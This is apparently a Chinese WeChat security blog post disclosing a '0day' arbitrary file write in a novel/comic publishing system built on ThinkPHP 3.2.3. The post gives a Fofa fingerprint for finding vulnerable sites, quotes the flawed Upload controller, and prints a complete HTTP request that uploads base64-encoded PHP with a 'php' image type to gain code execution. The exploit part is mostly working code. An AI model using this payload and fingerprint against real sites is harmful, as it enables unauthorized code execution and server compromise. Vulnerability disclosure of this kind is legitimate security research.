#  微信公众号小说漫画系统前台任意文件写入漏洞(RCE)   
原创 Mstir  星悦安全   2024-10-05 11:16  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字关注我们 并设为  
星标  
## 0x00 前言  
  
******源码描述：修复版掌上阅读小说源码_公众号漫画源码可以打包漫画app，掌上阅读小说源码支持公众号、代理分站支付功能完善强大的小说源码，可以对接微信公众号、APP打包。支持对接个人微信收款。**  
  
**1新增签到、平台分享奖励书币、小说推广链接生成，更好的推广平台增加粘性。**  
  
**2.新增可自定义中间和底部导航。**  
  
**3.新增可添加章节广告增加收益.**  
  
**4.可以管理公众号菜单、消息推送、自定义回复。**  
  
**5.可以添加加盟商分站，可添加代理、自定义扣量。**  
  
**Fofa指纹:"/Public/home/mhjs/jquery.js"**  
  
****  
**框架:ThinkPHP 3.2.3 Debug:True**  
## 0x01 漏洞分析&复现  
  
**需要普通用户登录权限(可直接注册)**  
  
**位于 /Application/Home/Controller/IndexAjaxController.class.php 控制器的Upload方法通过base64传入img,size两个参数，然后再通过file_put_contents函数来将base64编码后的文件写入到Upload目录之中去.**  
  
**需要注意的是 size 参数为传入的img参数的长度( 包括data:///协议本体)**  
```
/**
* 公共上传图片方法
*/
public function Upload(){
  $base64_image_content = I("post.img");
  $image_name = I("post.name");
  $len = I("post.size");
  $baseLen = strlen($base64_image_content);
  if($len!=$baseLen)  $this->error("上传图片不完整");
  if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_image_content, $result)){
    $uploadFolder  = C('UPLOADPATH').date("Ymd")."/";
    if(!is_dir($uploadFolder)){
      if(!mkdir($uploadFolder, 0755, true)){
        $this->error('创建文件失败');
      }
    }
    $type = $result[2];
    if(empty($image_name)){
      $new_file = $uploadFolder.date("His")."_".mt_rand(0, 1000).".{$type}";
    }else{
      $new_file = $uploadFolder.$image_name."_".date("mdHis").".{$type}";
    }
    $img_64 = base64_decode(str_replace($result[1], '', $base64_image_content));
    if (file_put_contents($new_file,$img_64)){
      $this->success(complete_url($new_file));
    }
  }else{
    $this->error("图片不存在");
  }

}
```  
  
**Payload:**  
```
POST /index.php?m=&c=IndexAjax&a=Upload HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 78
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=bf13e78oe1uqp8nh3crld1gu55; uloginid=107639
Host: 127.0.0.1
Origin: http://127.0.0.1
Pragma: no-cache
Referer: http://127.0.0.1/index.php?m=&c=IndexAjax
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"

img=data:image/php;base64,YTw/cGhwIHBocGluZm8oKTs/Pg==&size=50
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dd5abOpeCETs07ZVhZO7hqT9QOGkHhQL89K80vNhmib7TFXCrB2jWcW9leEWEJm1RuH1qRGoFwcpA/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dd5abOpeCETs07ZVhZO7hqgoH72kkHktdYmM4AC5uNibdyIh3HV8XGaK0v0H5SBibyJsdicA7JOCscw/640?wx_fmt=other&from=appmsg "")  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**漫画系统源码关注公众号发送 241004 获取!**  
  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
